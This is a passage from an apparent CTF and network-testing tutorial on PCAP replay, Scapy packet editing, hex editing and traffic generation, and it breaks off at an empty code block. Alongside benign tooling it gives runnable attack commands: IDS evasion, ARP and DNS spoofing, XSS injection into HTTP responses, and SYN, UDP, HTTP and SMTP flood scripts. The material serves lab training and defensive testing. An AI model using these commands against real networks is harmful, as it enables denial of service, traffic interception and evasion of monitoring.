# Bridge with IP rewriting
tcpbridge -i eth0 -o eth1 --srcipmap=192.168.1.0/24:10.0.0.0/24

# Bridge with selective forwarding (BPF filter)
tcpbridge -i eth0 -o eth1 -x "tcp port 80"
```

**tcprewrite - Pre-process PCAP Files**

```bash
# Rewrite IP addresses in PCAP file
tcprewrite --infile=capture.pcap --outfile=rewritten.pcap \
  --srcipmap=192.168.1.0/24:10.0.0.0/24 \
  --dstipmap=192.168.2.0/24:10.1.0.0/24

# Change MAC addresses
tcprewrite --infile=capture.pcap --outfile=new_mac.pcap \
  --enet-smac=00:11:22:33:44:55 \
  --enet-dmac=AA:BB:CC:DD:EE:FF

# Randomize IP addresses (maintain relationships)
tcprewrite --infile=capture.pcap --outfile=randomized.pcap \
  --seed=12345 --fixcsum

# Strip VLAN tags
tcprewrite --infile=capture.pcap --outfile=no_vlan.pcap \
  --enet-vlan=del

# Add VLAN tag
tcprewrite --infile=capture.pcap --outfile=with_vlan.pcap \
  --enet-vlan=add --enet-vlan-tag=100

# MTU truncation (reduce packet size)
tcprewrite --infile=capture.pcap --outfile=truncated.pcap \
  --mtu=1400 --mtu-trunc

# Fix checksums
tcprewrite --infile=capture.pcap --outfile=fixed.pcap --fixcsum

# Skip specific packet types
tcprewrite --infile=capture.pcap --outfile=filtered.pcap \
  --skipbroadcast
```

### Advanced tcpreplay Techniques

**Dual Interface Replay (Client/Server Split)**

```bash
# Split traffic based on endpoints
tcpreplay-edit --cachefile=cache.cache -i eth0 -I eth1 capture.pcap

# Generate cache file first
tcpprep --auto=bridge --pcap=capture.pcap --cachefile=cache.cache

# Manual cache creation (specify client network)
tcpprep --cidr=192.168.1.0/24 --pcap=capture.pcap --cachefile=cache.cache

# Replay with cache
tcpreplay --cachefile=cache.cache -i eth0 -I eth1 capture.pcap
```

**Timing Control and Synchronization**

```bash
# Use exact timestamps from PCAP
tcpreplay -i eth0 capture.pcap

# Ignore timestamps, send as fast as possible
tcpreplay -t -i eth0 capture.pcap

# Replay at specific Mbps rate
tcpreplay -M 100 -i eth0 capture.pcap

# Packets per second rate limiting
tcpreplay -p 1000 -i eth0 capture.pcap

# Precise timing with nanosecond resolution
tcpreplay --timer=nano -i eth0 capture.pcap

# One packet at a time (manual pacing)
tcpreplay --one-at-a-time -i eth0 capture.pcap
```

**Pre-loading and Performance**

```bash
# Preload PCAP into RAM for faster replay
tcpreplay --preload-pcap -i eth0 large_capture.pcap

# Enable netmap for high-performance replay
tcpreplay --netmap -i netmap:eth0 capture.pcap

# Multiple concurrent replays
for i in {1..10}; do
    tcpreplay -i eth0 capture.pcap &
done
wait
```

### CTF-Specific tcpreplay Usage

**Trigger Exploit in Vulnerable Service**

```bash
# Replay exploit traffic to test defense mechanisms
tcpreplay-edit --srcipmap=0.0.0.0/0:10.0.0.100 \
  --dstipmap=0.0.0.0/0:10.0.0.200 \
  --fixcsum -i eth0 exploit_traffic.pcap

# Replay with specific timing to bypass rate limiting
tcpreplay -M 1 -i eth0 exploit_traffic.pcap  # 1 Mbps slow replay
```

**Evade IDS/IPS During Replay**

```bash
# Fragment packets during replay
tcpreplay-edit --mtu=500 --fixcsum -i eth0 attack.pcap

# Randomize source IPs to avoid correlation
tcpreplay --unique-ip --unique-ip-loops=1000 -i eth0 scan.pcap

# Change TTL to appear from different hop distance
tcpreplay-edit --ttl=128 -i eth0 windows_traffic.pcap
tcpreplay-edit --ttl=64 -i eth0 linux_traffic.pcap
```

---

## Packet Editing with Scapy

### Scapy Fundamentals

**Basic Packet Construction**

```python
from scapy.all import *

# Simple ICMP packet
packet = IP(dst="192.168.1.1")/ICMP()
send(packet)

# TCP SYN packet
syn = IP(dst="192.168.1.100")/TCP(dport=80, flags="S")
send(syn)

# UDP packet with payload
udp_pkt = IP(dst="192.168.1.50")/UDP(dport=53)/Raw(load="test data")
send(udp_pkt)

# ARP request
arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1")
sendp(arp, iface="eth0")

# Layer 2 vs Layer 3 sending
send(packet)      # Layer 3 - OS handles routing
sendp(packet, iface="eth0")  # Layer 2 - specify interface
```

**Reading and Modifying PCAP Files**

```python
from scapy.all import *

# Read PCAP file
packets = rdpcap('capture.pcap')

# Access individual packets
first_packet = packets[0]
print(first_packet.summary())

# Iterate through packets
for pkt in packets:
    if pkt.haslayer(TCP):
        print(f"TCP packet: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")

# Modify packets
modified_packets = []
for pkt in packets:
    if pkt.haslayer(IP):
        # Change source IP
        pkt[IP].src = "10.0.0.100"
        # Recalculate checksums
        del pkt[IP].chksum
        if pkt.haslayer(TCP):
            del pkt[TCP].chksum
        modified_packets.append(pkt)

# Write modified packets
wrpcap('modified.pcap', modified_packets)
```

### Advanced Packet Manipulation

**IP Address Manipulation**

```python
from scapy.all import *

packets = rdpcap('capture.pcap')

# Change all source IPs in a subnet
for pkt in packets:
    if pkt.haslayer(IP):
        old_ip = pkt[IP].src
        # Map 192.168.1.x to 10.0.0.x
        if old_ip.startswith("192.168.1."):
            last_octet = old_ip.split('.')[-1]
            pkt[IP].src = f"10.0.0.{last_octet}"
        
        # Delete checksum to force recalculation
        del pkt[IP].chksum
        if pkt.haslayer(TCP):
            del pkt[TCP].chksum
        elif pkt.haslayer(UDP):
            del pkt[UDP].chksum

wrpcap('rewritten_ips.pcap', packets)
```

**MAC Address Manipulation**

```python
from scapy.all import *

packets = rdpcap('capture.pcap')

new_packets = []
for pkt in packets:
    if pkt.haslayer(Ether):
        # Change source MAC
        pkt[Ether].src = "00:11:22:33:44:55"
        # Change destination MAC
        pkt[Ether].dst = "AA:BB:CC:DD:EE:FF"
    new_packets.append(pkt)

wrpcap('new_macs.pcap', new_packets)
```

**TCP Flag Manipulation**

```python
from scapy.all import *

# Create packets with specific flag combinations
tcp_flags = {
    'syn': IP(dst="192.168.1.100")/TCP(dport=80, flags="S"),
    'syn_ack': IP(dst="192.168.1.100")/TCP(dport=80, flags="SA"),
    'ack': IP(dst="192.168.1.100")/TCP(dport=80, flags="A"),
    'fin': IP(dst="192.168.1.100")/TCP(dport=80, flags="F"),
    'rst': IP(dst="192.168.1.100")/TCP(dport=80, flags="R"),
    'psh_ack': IP(dst="192.168.1.100")/TCP(dport=80, flags="PA"),
    'xmas': IP(dst="192.168.1.100")/TCP(dport=80, flags="FPU"),  # FIN, PSH, URG
    'null': IP(dst="192.168.1.100")/TCP(dport=80, flags="")
}

# Modify existing PCAP TCP flags
packets = rdpcap('capture.pcap')
for pkt in packets:
    if pkt.haslayer(TCP):
        # Convert all packets to RST
        pkt[TCP].flags = "R"
        del pkt[TCP].chksum

wrpcap('all_rst.pcap', packets)
```

**Payload Manipulation**

```python
from scapy.all import *

packets = rdpcap('capture.pcap')

# Find and replace payload data
for pkt in packets:
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load
        
        # Replace specific strings
        if b'password' in payload:
            new_payload = payload.replace(b'password', b'FLAG{found_it}')
            pkt[Raw].load = new_payload
            
            # Recalculate checksums
            if pkt.haslayer(IP):
                del pkt[IP].chksum
            if pkt.haslayer(TCP):
                del pkt[TCP].chksum
            elif pkt.haslayer(UDP):
                del pkt[UDP].chksum

wrpcap('modified_payload.pcap', packets)
```

**HTTP Request/Response Modification**

```python
from scapy.all import *

packets = rdpcap('http_traffic.pcap')

for pkt in packets:
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
        
        # Modify HTTP request
        if payload.startswith('GET') or payload.startswith('POST'):
            # Change User-Agent
            modified = payload.replace(
                'User-Agent: Mozilla',
                'User-Agent: CustomAgent/1.0'
            )
            pkt[Raw].load = modified.encode()
            
            # Fix length fields
            if pkt.haslayer(IP):
                pkt[IP].len = None  # Auto-calculate
                del pkt[IP].chksum
            if pkt.haslayer(TCP):
                del pkt[TCP].chksum
        
        # Modify HTTP response
        if payload.startswith('HTTP/1'):
            # Inject content
            if 'Content-Type: text/html' in payload:
                parts = payload.split('\r\n\r\n', 1)
                if len(parts) == 2:
                    header, body = parts
                    body = '<script>alert("XSS")</script>' + body
                    pkt[Raw].load = (header + '\r\n\r\n' + body).encode()
                    
                    if pkt.haslayer(IP):
                        pkt[IP].len = None
                        del pkt[IP].chksum
                    if pkt.haslayer(TCP):
                        del pkt[TCP].chksum

wrpcap('modified_http.pcap', packets)
```

### Protocol-Specific Manipulation

**DNS Packet Crafting**

```python
from scapy.all import *

# Create DNS query
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
send(dns_query)

# Create DNS response (spoofed)
dns_response = IP(dst="192.168.1.100", src="8.8.8.8")/\
               UDP(dport=12345, sport=53)/\
               DNS(id=0x1234, qr=1, aa=1, qd=DNSQR(qname="example.com"),
                   an=DNSRR(rrname="example.com", ttl=3600, rdata="1.2.3.4"))
send(dns_response)

# Modify DNS responses in PCAP
packets = rdpcap('dns_traffic.pcap')
for pkt in packets:
    if pkt.haslayer(DNS) and pkt[DNS].qr == 1:  # DNS response
        if pkt[DNS].an:
            # Change DNS answer
            pkt[DNS].an.rdata = "10.0.0.1"
            del pkt[IP].chksum
            del pkt[UDP].chksum

wrpcap('poisoned_dns.pcap', packets)
```

**ARP Packet Manipulation**

```python
from scapy.all import *

# ARP request
arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1")
sendp(arp_req, iface="eth0")

# ARP reply (spoofed)
arp_reply = Ether(dst="aa:bb:cc:dd:ee:ff", src="00:11:22:33:44:55")/\
            ARP(op=2, hwsrc="00:11:22:33:44:55", psrc="192.168.1.1",
                hwdst="aa:bb:cc:dd:ee:ff", pdst="192.168.1.100")
sendp(arp_reply, iface="eth0")

# Gratuitous ARP
garp = Ether(dst="ff:ff:ff:ff:ff:ff")/\
       ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.1",
           hwsrc="00:11:22:33:44:55")
sendp(garp, iface="eth0")
```

**ICMP Manipulation**

```python
from scapy.all import *

# ICMP echo request with custom payload
icmp_req = IP(dst="192.168.1.1")/ICMP(type=8, code=0)/Raw(load="A"*56)
send(icmp_req)

# ICMP echo reply (spoofed)
icmp_reply = IP(src="192.168.1.1", dst="192.168.1.100")/\
             ICMP(type=0, code=0, id=12345, seq=1)/Raw(load="FLAG{hidden}")
send(icmp_reply)

# ICMP destination unreachable
icmp_unreach = IP(dst="192.168.1.100")/\
               ICMP(type=3, code=3)/\
               IP(dst="192.168.1.200")/TCP(dport=80)
send(icmp_unreach)

# Extract data from ICMP payloads in PCAP
packets = rdpcap('icmp_traffic.pcap')
for pkt in packets:
    if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
        data = pkt[Raw].load
        print(f"ICMP payload: {data}")
```

### Advanced Scapy Techniques

**Packet Fuzzing**

```python
from scapy.all import *

# Fuzz TCP options
fuzzed = IP(dst="192.168.1.100")/TCP(dport=80, options=[('MSS', 1460)])
send(fuzzed)

# Fuzz multiple fields
fuzzed = IP(dst="192.168.1.100", flags="DF")/\
         TCP(dport=fuzz(RandShort()), flags=fuzz(RandByte()))
send(fuzzed, count=100)

# Fuzz HTTP headers
http_fuzz = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/\
            Raw(load=f"GET / HTTP/1.1\r\nHost: {RandString(100)}\r\n\r\n")
send(http_fuzz)
```

**Packet Fragmentation**

```python
from scapy.all import *

# Fragment large packet
large_payload = "A" * 5000
packet = IP(dst="192.168.1.100")/ICMP()/Raw(load=large_payload)

# Automatic fragmentation
fragments = fragment(packet, fragsize=1480)
for frag in fragments:
    send(frag)

# Manual fragmentation with specific offsets
frag1 = IP(dst="192.168.1.100", flags="MF", frag=0)/Raw(load="A"*1400)
frag2 = IP(dst="192.168.1.100", flags="MF", frag=175)/Raw(load="B"*1400)
frag3 = IP(dst="192.168.1.100", frag=350)/Raw(load="C"*800)
send([frag1, frag2, frag3])

# Overlapping fragments (evasion technique)
frag1 = IP(dst="192.168.1.100", flags="MF", frag=0)/Raw(load="AAAA")
frag2 = IP(dst="192.168.1.100", frag=1)/Raw(load="BBBB")  # Overlaps
send([frag1, frag2])
```

**Session Reconstruction and Replay**

```python
from scapy.all import *

# Read PCAP and extract TCP session
packets = rdpcap('capture.pcap')
session = packets.sessions()

# Get specific TCP stream
for session_id, session_packets in session.items():
    if 'TCP' in session_id and '192.168.1.100:80' in session_id:
        print(f"Session: {session_id}")
        for pkt in session_packets:
            if pkt.haslayer(Raw):
                print(pkt[Raw].load)

# Replay specific session with modifications
for pkt in session_packets:
    if pkt.haslayer(IP):
        pkt[IP].src = "10.0.0.50"  # Change source
        del pkt[IP].chksum
        if pkt.haslayer(TCP):
            del pkt[TCP].chksum
    send(pkt)
```

**Custom Protocol Dissection**

```python
from scapy.all import *

# Define custom protocol layer
class CustomProto(Packet):
    name = "CustomProtocol"
    fields_desc = [
        ByteField("version", 1),
        ByteField("type", 0),
        ShortField("length", 0),
        StrLenField("data", "", length_from=lambda pkt: pkt.length)
    ]

# Bind to port
bind_layers(TCP, CustomProto, dport=9999)

# Create packet with custom protocol
pkt = IP(dst="192.168.1.100")/TCP(dport=9999)/CustomProto(type=5, data="test")
send(pkt)

# Parse PCAP with custom protocol
packets = rdpcap('custom_proto.pcap')
for pkt in packets:
    if pkt.haslayer(CustomProto):
        print(f"Custom proto type: {pkt[CustomProto].type}")
        print(f"Data: {pkt[CustomProto].data}")
```

---

## WireEdit/Hex Editing

### GUI-Based Packet Editing

**WireEdit Usage** [Inference]

WireEdit is a GUI tool for editing PCAP files at the packet level.

```bash
# Install WireEdit
apt-get install wireedit

# Launch GUI
wireedit capture.pcap

# Key features:
# - Visual packet list with protocol decoding
# - Hex editor for raw packet data
# - Field-level editing (IP addresses, ports, flags)
# - Checksum recalculation
# - Packet insertion/deletion
# - Save modified PCAP
```

**Wireshark Packet Editing** [Inference]

```bash
# Open PCAP in Wireshark
wireshark capture.pcap

# Edit packet:
# 1. Right-click packet → "Edit Packet" (requires editcap)
# 2. Modify hex values in packet bytes pane
# 3. File → Export Specified Packets → Save modified

# Command-line packet editing with editcap
editcap -F pcap input.pcap output.pcap
```

### Hex Editing Tools

**hexedit - Terminal Hex Editor**

```bash
# Install hexedit
apt-get install hexedit

# Open PCAP file
hexedit capture.pcap

# Navigation:
# Arrow keys: Move cursor
# Tab: Switch between hex and ASCII
# Ctrl+S: Save
# Ctrl+X: Exit

# PCAP structure (key offsets):
# 0x00-0x17: Global header (24 bytes)
# Per-packet: 16-byte header + packet data
# Packet header offsets:
#   +0x00: Timestamp seconds (4 bytes)
#   +0x04: Timestamp microseconds (4 bytes)
#   +0x08: Captured length (4 bytes)
#   +0x0C: Actual length (4 bytes)
```

**xxd - Hex Dump and Manipulation**

```bash
# Create hex dump
xxd capture.pcap > capture.hex

# Edit hex dump in text editor
nano capture.hex

# Convert back to binary
xxd -r capture.hex > modified.pcap

# Practical example: Change IP address
# Find IP address in hex (e.g., 192.168.1.100 = C0 A8 01 64)
xxd capture.pcap | grep "c0a8 0164"
# Note the offset, edit hex file, convert back
```

**ghex - GTK Hex Editor**

```bash
# Install ghex
apt-get install ghex

# Launch
ghex capture.pcap

# Features:
# - Search for hex or ASCII strings
# - Jump to specific offset
# - Compare files
# - Edit and save
```

### Manual Packet Field Editing

**Ethernet Frame Editing**

```bash
# Ethernet frame structure (first 14 bytes):
# 0-5: Destination MAC (6 bytes)
# 6-11: Source MAC (6 bytes)
# 12-13: EtherType (2 bytes, e.g., 0x0800 for IPv4)

# Example: Change source MAC to 00:11:22:33:44:55
# Hex: 00 11 22 33 44 55
# Offset: Byte 6-11 of each packet (after PCAP packet header)

# Using dd to modify at specific offset
# [Inference] This approach requires precise offset calculation
```

**IPv4 Header Editing**

```bash
# IPv4 header structure (20 bytes minimum):
# Byte 0: Version (4 bits) + IHL (4 bits)
# Byte 1: DSCP/ToS
# Bytes 2-3: Total Length
# Bytes 4-5: Identification
# Bytes 6-7: Flags + Fragment Offset
# Byte 8: TTL
# Byte 9: Protocol (6=TCP, 17=UDP, 1=ICMP)
# Bytes 10-11: Header Checksum
# Bytes 12-15: Source IP
# Bytes 16-19: Destination IP

# Example: Change source IP from 192.168.1.100 to 10.0.0.50
# Old hex: C0 A8 01 64
# New hex: 0A 00 00 32
# Must recalculate header checksum (bytes 10-11)
```

**TCP Header Editing**

```bash
# TCP header structure (20 bytes minimum):
# Bytes 0-1: Source Port
# Bytes 2-3: Destination Port
# Bytes 4-7: Sequence Number
# Bytes 8-11: Acknowledgment Number
# Byte 12: Data Offset (4 bits) + Reserved (3 bits) + Flags (1 bit)
# Byte 13: Flags (8 bits: CWR, ECE, URG, ACK, PSH, RST, SYN, FIN)
# Bytes 14-15: Window Size
# Bytes 16-17: Checksum
# Bytes 18-19: Urgent Pointer

# TCP flags (byte 13):
# 0x02: SYN
# 0x10: ACK
# 0x12: SYN+ACK
# 0x04: RST
# 0x01: FIN
# 0x18: PSH+ACK

# Example: Change flag from ACK (0x10) to RST (0x04)
# Find TCP header, modify byte 13, recalculate checksum
```

### Checksum Recalculation

**Manual Checksum Calculation**

```python
# IPv4 header checksum algorithm
def calculate_ipv4_checksum(header):
    """
    header: bytes object of IP header with checksum field zeroed
    """
    # Sum all 16-bit words
    checksum = 0
    for i in range(0, len(header), 2):
        word = (header[i] << 8) + header[i+1]
        checksum += word
    
    # Add carry bits
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    # One's complement
    checksum = ~checksum & 0xFFFF
    return checksum

# Example usage
import struct

ip_header = bytearray(b'\x45\x00\x00\x3c\x1c\x46\x40\x00\x40\x06'
                       b'\x00\x00\xac\x10\x0a\x63\xac\x10\x0a\x0c')
ip_header[10:12] = b'\x00\x00'  # Zero out checksum field

checksum = calculate_ipv4_checksum(bytes(ip_header))
ip_header[10:12] = struct.pack('!H', checksum)
print(f"Checksum: 0x{checksum:04x}")
```

**TCP/UDP Pseudo-Header Checksum**

```python
def calculate_tcp_checksum(src_ip, dst_ip, tcp_segment):
    """
    TCP checksum includes pseudo-header
    """
    # Pseudo-header
    pseudo = struct.pack('!4s4sBBH',
                         src_ip,      # Source IP (4 bytes)
                         dst_ip,      # Dest IP (4 bytes)
                         0,           # Reserved (1 byte)
                         6,           # Protocol TCP=6 (1 byte)
                         len(tcp_segment))  # TCP length (2 bytes)
    
    # Combine pseudo-header and TCP segment
    combined = pseudo + tcp_segment
    
    # Calculate checksum (same algorithm as IP)
    checksum = 0
    for i in range(0, len(combined), 2):
        if i + 1 < len(combined):
            word = (combined[i] << 8) + combined[i+1]
        else:
            word = combined[i] << 8
        checksum += word
    
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return ~checksum & 0xFFFF
```

**Automated Checksum Fixing**

```bash
# Using tcpre write to fix checksums
tcprewrite --infile=modified.pcap --outfile=fixed.pcap --fixcsum

# Using Scapy to fix all checksums
python3 << 'EOF'
from scapy.all import *

packets = rdpcap('modified.pcap') 
fixed_packets = []

for pkt in packets: 
	# Delete existing checksums to force recalculation 
	if pkt.haslayer(IP): 
		del pkt[IP].chksum 
		del pkt[IP].len # Recalculate length too

	if pkt.haslayer(TCP):
	    del pkt[TCP].chksum
	
	if pkt.haslayer(UDP):
	    del pkt[UDP].chksum
	
	if pkt.haslayer(ICMP):
	    del pkt[ICMP].chksum

	# Rebuild packet (forces recalculation)
	fixed_packets.append(pkt.__class__(bytes(pkt)))

wrpcap('fixed.pcap', fixed_packets) 
EOF
```

### Batch Hex Editing with Scripts

**Python Hex Editing Script**

```python
#!/usr/bin/env python3
import sys

def modify_pcap_hex(input_file, output_file, search_hex, replace_hex):
    """
    Search and replace hex patterns in PCAP file
    """
    with open(input_file, 'rb') as f:
        data = bytearray(f.read())
    
    # Convert hex strings to bytes
    search_bytes = bytes.fromhex(search_hex.replace(' ', ''))
    replace_bytes = bytes.fromhex(replace_hex.replace(' ', ''))
    
    if len(search_bytes) != len(replace_bytes):
        print("Error: Search and replace must be same length")
        return
    
    # Find and replace all occurrences
    count = 0
    offset = 0
    while True:
        pos = data.find(search_bytes, offset)
        if pos == -1:
            break
        data[pos:pos+len(search_bytes)] = replace_bytes
        count += 1
        offset = pos + len(search_bytes)
    
    print(f"Replaced {count} occurrences")
    
    with open(output_file, 'wb') as f:
        f.write(data)

# Usage example
if __name__ == "__main__":
    # Replace IP 192.168.1.100 (C0 A8 01 64) with 10.0.0.50 (0A 00 00 32)
    modify_pcap_hex('capture.pcap', 'modified.pcap', 
                    'C0 A8 01 64', '0A 00 00 32')
````

**sed Hex Pattern Replacement** [Inference]

```bash
# Binary sed replacement (use with caution)
# Replace MAC address pattern
sed -i 's/\x00\x11\x22\x33\x44\x55/\xAA\xBB\xCC\xDD\xEE\xFF/g' capture.pcap

# Note: This can corrupt PCAP if pattern appears in headers
# Better to use tools designed for PCAP manipulation
```

**Perl One-Liners for Binary Editing**

```bash
# Replace hex pattern in binary file
perl -pi -e 's/\xC0\xA8\x01\x64/\x0A\x00\x00\x32/g' capture.pcap

# More complex: Replace with position awareness
perl -pe 'BEGIN{$/=\1024} s/pattern/replacement/g' capture.pcap > modified.pcap
```

### PCAP Structure Manipulation

**PCAP Global Header Editing**

```bash
# PCAP Global Header (24 bytes):
# Bytes 0-3: Magic number (0xA1B2C3D4 or 0xA1B23C4D for nanosecond)
# Bytes 4-5: Version major (0x0002)
# Bytes 6-7: Version minor (0x0004)
# Bytes 8-11: GMT to local correction (0x00000000)
# Bytes 12-15: Timestamp accuracy (0x00000000)
# Bytes 16-19: Snapshot length (0x0000FFFF typically)
# Bytes 20-23: Data link type (0x00000001 for Ethernet)

# Change snapshot length to 65535
printf '\xFF\xFF\x00\x00' | dd of=capture.pcap bs=1 seek=16 count=4 conv=notrunc

# Change link type to raw IP (101 = 0x65)
printf '\x65\x00\x00\x00' | dd of=capture.pcap bs=1 seek=20 count=4 conv=notrunc
```

**Packet Header Manipulation**

```bash
# PCAP Packet Header (16 bytes per packet):
# Bytes 0-3: Timestamp seconds
# Bytes 4-7: Timestamp microseconds
# Bytes 8-11: Captured packet length
# Bytes 12-15: Actual packet length

# Python script to modify packet timestamps
cat > modify_timestamps.py << 'EOF'
import struct
import sys

with open(sys.argv[1], 'rb') as f:
    data = bytearray(f.read())

# Skip global header (24 bytes)
offset = 24

while offset < len(data):
    # Read packet header
    ts_sec, ts_usec, incl_len, orig_len = struct.unpack_from('<IIII', data, offset)
    
    # Modify timestamp (add 1 hour = 3600 seconds)
    ts_sec += 3600
    
    # Write back modified timestamp
    struct.pack_into('<I', data, offset, ts_sec)
    
    # Skip to next packet (header + data)
    offset += 16 + incl_len

with open(sys.argv[2], 'wb') as f:
    f.write(data)
EOF

python3 modify_timestamps.py input.pcap output.pcap
```

### CTF-Specific Hex Editing Scenarios

**Flag Extraction from Manipulated Packets**

```bash
# Scenario: Flag hidden in TCP sequence numbers
# Extract sequence numbers and decode

tshark -r capture.pcap -Y "tcp" -T fields -e tcp.seq | \
while read seq; do
    # Convert to hex and look for ASCII
    printf "%08x" $seq | xxd -r -p
done

# Scenario: Flag in modified checksums
# Extract IP checksums (might encode data)
tshark -r capture.pcap -T fields -e ip.checksum | \
while read chksum; do
    printf "%04x" 0x$chksum | xxd -r -p
done | strings
```

**Steganography in Packet Fields**

```python
from scapy.all import *

# Extract LSBs from IP ID fields (covert channel)
packets = rdpcap('capture.pcap')
bits = []

for pkt in packets:
    if pkt.haslayer(IP):
        ip_id = pkt[IP].id
        # Extract least significant bit
        bits.append(ip_id & 1)

# Convert bits to bytes
flag = ''
for i in range(0, len(bits), 8):
    byte_bits = bits[i:i+8]
    if len(byte_bits) == 8:
        byte_val = int(''.join(map(str, byte_bits)), 2)
        flag += chr(byte_val)

print(f"Hidden data: {flag}")
```

**Packet Splitting and Merging**

```bash
# Split PCAP into individual packets
tshark -r capture.pcap -w packet_ -F pcap

# Manually edit individual packet files with hex editor

# Merge back together
mergecap -w merged.pcap packet_*

# Or use editcap to extract specific packet range
editcap -r capture.pcap output.pcap 100-200
```

---

## Traffic Generation

### High-Volume Traffic Generation

**hping3 - Packet Crafting and Flooding**

```bash
# TCP SYN flood
hping3 -S -p 80 --flood 192.168.1.100

# TCP SYN flood with random source IPs
hping3 -S -p 80 --flood --rand-source 192.168.1.100

# UDP flood
hping3 --udp -p 53 --flood 192.168.1.100

# ICMP flood
hping3 --icmp --flood 192.168.1.1

# Specific packet rate (packets per second)
hping3 -S -p 80 --faster 192.168.1.100  # ~10 pps
hping3 -S -p 80 --fast 192.168.1.100    # ~100 pps
hping3 -S -p 80 -i u1000 192.168.1.100  # 1000 pps (1ms interval)

# Custom TCP flags
hping3 -F -P -U -p 80 192.168.1.100  # FIN, PSH, URG (Xmas scan)
hping3 -p 80 192.168.1.100           # NULL scan (no flags)

# Fragmented packets
hping3 -S -p 80 -f 192.168.1.100

# Custom packet size
hping3 -S -p 80 -d 1400 192.168.1.100  # 1400 bytes data

# Traceroute mode with custom TTL
hping3 --traceroute -S -p 80 192.168.1.100

# Custom source port
hping3 -S -p 80 -s 12345 192.168.1.100

# Multiple destination ports
hping3 -S --scan 80,443,8080 192.168.1.100
```

**mz (mausezahn) - Advanced Traffic Generator**

```bash
# Install mausezahn
apt-get install mausezahn

# Simple ICMP flood
mz eth0 -c 0 -t icmp "type=8" -B 192.168.1.100

# TCP SYN with specific rate
mz eth0 -t tcp "dp=80,flags=syn" -c 1000 -d 1ms -B 192.168.1.100

# UDP packet with payload
mz eth0 -t udp "dp=53,sp=12345" -P "test payload" -B 192.168.1.100

# DNS query generation
mz eth0 -t dns "q=example.com,qtype=A" -c 100 -B 8.8.8.8

# ARP requests
mz eth0 -t arp "request,targetip=192.168.1.1"

# Custom Ethernet frame
mz eth0 -a 00:11:22:33:44:55 -b ff:ff:ff:ff:ff:ff -c 1 -p 64

# VLAN tagged traffic
mz eth0 -Q 100 -t tcp "dp=80,flags=syn" -B 192.168.1.100

# Random source IPs
mz eth0 -t tcp "dp=80,flags=syn" -A rand -c 1000 -B 192.168.1.100

# Hexadecimal payload
mz eth0 -t ip -P "48656c6c6f" -B 192.168.1.100  # "Hello"

# Inter-packet delay
mz eth0 -t tcp "dp=80" -c 100 -d 100ms -B 192.168.1.100
```

**ostinato - GUI Traffic Generator** [Inference]

```bash
# Install Ostinato
apt-get install ostinato

# Start GUI
ostinato

# Command-line drone (agent)
drone &

# Features:
# - Visual stream configuration
# - Protocol stack building
# - Pattern-based payload generation
# - Precise rate control
# - Statistics collection
# - Multi-stream management
```

### Protocol-Specific Traffic Generation

**HTTP Traffic Generation**

```bash
# ab (Apache Bench) - HTTP load testing
ab -n 1000 -c 10 http://192.168.1.100/  # 1000 requests, 10 concurrent

# With POST data
ab -n 100 -c 5 -p post_data.txt -T application/x-www-form-urlencoded \
   http://192.168.1.100/login

# Custom headers
ab -n 100 -H "User-Agent: CustomAgent" http://192.168.1.100/

# siege - HTTP stress testing
siege -c 25 -r 100 http://192.168.1.100/  # 25 concurrent, 100 reps each

# Random URLs from file
siege -c 10 -f urls.txt

# curl in loop
for i in {1..1000}; do
    curl -s http://192.168.1.100/ > /dev/null &
done
wait

# Python requests script
cat > http_flood.py << 'EOF'
import requests
import concurrent.futures

def send_request(url):
    try:
        r = requests.get(url, timeout=5)
        return r.status_code
    except:
        return None

url = "http://192.168.1.100/"
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(send_request, url) for _ in range(1000)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

print(f"Completed {len([r for r in results if r])} requests")
EOF

python3 http_flood.py
```

**DNS Traffic Generation**

```bash
# dnsperf - DNS performance testing
# Create query file
cat > queries.txt << 'EOF'
example.com A
google.com A
facebook.com A
EOF

dnsperf -s 8.8.8.8 -d queries.txt -c 10 -l 60

# dig in loop
for i in {1..100}; do
    dig @8.8.8.8 example.com +short &
done
wait

# Scapy DNS flood
python3 << 'EOF'
from scapy.all import *
import random

domains = ['example.com', 'test.com', 'sample.org']
for i in range(1000):
    domain = random.choice(domains)
    dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    send(dns_query, verbose=0)
EOF
```

**SMTP Traffic Generation**

```bash
# swaks - SMTP testing tool
swaks --to recipient@example.com \
      --from sender@test.com \
      --server 192.168.1.100 \
      --body "Test message"

# Multiple emails in loop
for i in {1..100}; do
    swaks --to user$i@example.com \
          --from test@sender.com \
          --server 192.168.1.100 \
          --body "Message $i" &
done
wait

# Python SMTP script
cat > smtp_flood.py << 'EOF'
import smtplib
from email.mime.text import MIMEText

smtp_server = "192.168.1.100"
for i in range(100):
    msg = MIMEText(f"Test message {i}")
    msg['Subject'] = f"Test {i}"
    msg['From'] = "sender@test.com"
    msg['To'] = f"recipient{i}@example.com"
    
    try:
        with smtplib.SMTP(smtp_server) as server:
            server.send_message(msg)
    except:
        pass
EOF

python3 smtp_flood.py
```

**FTP Traffic Generation**

```bash
# lftp scripted transfers
lftp -u username,password ftp://192.168.1.100 << 'EOF'
cd /upload
put testfile.txt
bye
EOF

# Parallel FTP connections
for i in {1..10}; do
    lftp -u user,pass ftp://192.168.1.100 -e "put file$i.txt; bye" &
done
wait

# Python ftplib
cat > ftp_traffic.py << 'EOF'
from ftplib import FTP
import io

ftp = FTP('192.168.1.100')
ftp.login('user', 'pass')

# Upload multiple files
for i in range(50):
    data = io.BytesIO(b"Test data" * 1000)
    ftp.storbinary(f'STOR file{i}.txt', data)

ftp.quit()
EOF

python3 ftp_traffic.py
```

### Scapy-Based Traffic Generation

**Connection Simulation**

```python
